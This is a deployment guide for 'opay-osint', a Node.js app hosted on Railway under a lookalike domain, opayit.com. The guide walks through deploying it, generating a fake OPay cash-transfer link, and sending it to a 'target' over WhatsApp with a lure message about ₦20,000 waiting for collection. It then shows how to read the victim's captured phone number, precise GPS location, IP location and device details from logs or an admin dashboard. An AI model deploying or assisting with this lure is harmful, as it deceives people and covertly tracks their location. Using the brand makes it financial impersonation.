# Railway Deployment Guide — opay-osint
Domain: `opayit.com`

---

## Step 1 — Deploy via GitHub (Recommended)

1. Create a new **private** repo on GitHub (e.g. `opay-osint`)
2. In PowerShell, from the `opay-osint` folder:

```powershell
git init
git add .
git commit -m "init"
git remote add origin https://github.com/YOUR_USERNAME/opay-osint.git
git push -u origin main
```

3. Go to [railway.app](https://railway.app) → **New Project → Deploy from GitHub repo**
4. Select your `opay-osint` repo
5. Railway auto-detects Node.js and runs `npm start` — no extra config needed
6. Wait ~60 seconds for the build → click the `.up.railway.app` URL to confirm

> Make sure `.gitignore` excludes `captures.json` and `node_modules/`

---

## Step 1 (Alternative) — Deploy via Railway CLI (No GitHub needed)

Use this if you don't want to use GitHub at all.

### Install Railway CLI

```powershell
npm install -g @railway/cli
```

### Login

```powershell
railway login
```

A browser window opens — sign in with Google or email.

### Create project and deploy

```powershell
cd C:\Users\Engineer\Documents\OSINT\opay-osint
railway init
railway up
```

- `railway init` creates a new Railway project and links this folder to it
- `railway up` uploads your files directly and deploys — **no Git required**
- Takes ~60 seconds, then prints your `.up.railway.app` URL

### Add environment variable

```powershell
railway variables set DATA_DIR=/data
```

### Redeploy after code changes

```powershell
railway up
```

Run this from the `opay-osint` folder whenever you make changes.

---

## Step 2 — Create Railway Project (GitHub path only)

---

## Step 3 — Add a Volume (persistent captures)

1. Inside your Railway project, click **+ New** → **Volume**
2. Set **Mount Path** to `/data`
3. Click **Add**
4. Go to your service → **Variables** tab → **Add Variable**:
   ```
   DATA_DIR = /data
   ```
5. Railway will redeploy automatically
6. `captures.json` will now survive redeploys and restarts

---

## Step 4 — Connect Custom Domain

### 4a — Add domain in Railway

1. In your Railway service → **Settings** → **Networking** → **Add Custom Domain**
2. Type `opayit.com` → click **Add**
3. Railway shows you a CNAME record, e.g.:
   ```
   Type:  CNAME
   Name:  @
   Value: <hash>.up.railway.app
   ```
4. Copy that `<hash>.up.railway.app` value — you need it in the next step

### 4b — Add DNS records in your registrar

> Steps below are for **Namecheap**. Other registrars are similar.

1. Log in to [namecheap.com](https://namecheap.com) → **Domain List** → click **Manage** next to `opayit.com`
2. Click the **Advanced DNS** tab
3. Delete any existing **A Record** or **CNAME** for `@` and `www`
4. Click **Add New Record** and add:
   ```
   Type:  CNAME Record
   Host:  @
   Value: <hash>.up.railway.app
   TTL:   Automatic
   ```
5. Click **Add New Record** again:
   ```
   Type:  CNAME Record
   Host:  www
   Value: <hash>.up.railway.app
   TTL:   Automatic
   ```
6. Click the green **Save All Changes** button
7. Wait **5–15 minutes** for DNS to propagate
8. Railway auto-issues HTTPS — no Certbot needed

### 4c — Change to a different domain later

If you want to swap `opayit.com` for a new domain:

1. Railway service → **Settings** → **Networking** → click the **trash icon** next to the old domain
2. Click **Add Custom Domain** → type the new domain → **Add**
3. Railway shows a new CNAME value
4. In your new registrar, add the CNAME record as above (Step 4b)
5. In your OLD registrar, delete the old CNAME records
6. Update `gen-link.js` line 3: change `DOMAIN` to the new URL
7. Redeploy (push a commit or click **Redeploy** in Railway)

> Test with: `curl -I https://opayit.com`

---

## Step 5 — Generate a Transaction Link

On your local machine:

```powershell
cd C:\Users\Engineer\Documents\OSINT\opay-osint
node gen-link.js
```

Output example:
```
  Transaction link:
  https://opayit.com/Kx9mVqP3nR2L

  WhatsApp message:
  "Hi, I sent you ₦20,000 via OPay cash transfer.
  Use this link to locate an agent near you to collect: https://opayit.com/Kx9mVqP3nR2L
  Reference: KX9MVQP3NR2L
  Expires in 1 hour."
```

Send the link to the target via WhatsApp.

---

## Step 6 — Monitor Captures

**Option A — Railway Logs (real-time)**
1. Railway project → your service → **Logs** tab
2. Every hit prints immediately:
   ```
   [!] PHONE:   +2348099003344  | TXN: Kx9mVqP3nR2L
   [!] GPS:     6.46542, 3.40612 (±14m)
       Maps: https://www.google.com/maps?q=6.46542,3.40612
   [!] IP GEO:  Lagos, Lagos State, Nigeria | 105.112.x.x | MTN Nigeria
   ```

**Option B — Dashboard**
1. Visit `https://opayit.com/admin`
2. Login: `opayadmin` / `password123`
3. Full table with GPS map links, phone numbers, IP location, device info
4. Auto-refreshes every 30 seconds

---

## Updating the App After Code Changes

```powershell
git add .
git commit -m "update"
git push
```

Railway auto-redeploys on every push. Takes ~30 seconds.

---

## Notes

- Keep the GitHub repo **private**
- Railway free tier: 500 hours/month — enough for continuous uptime
- Volume storage: ~$0.25/GB/month (captures.json stays tiny)
- Sessions reset on redeploy (admin tokens cleared) — just log in again
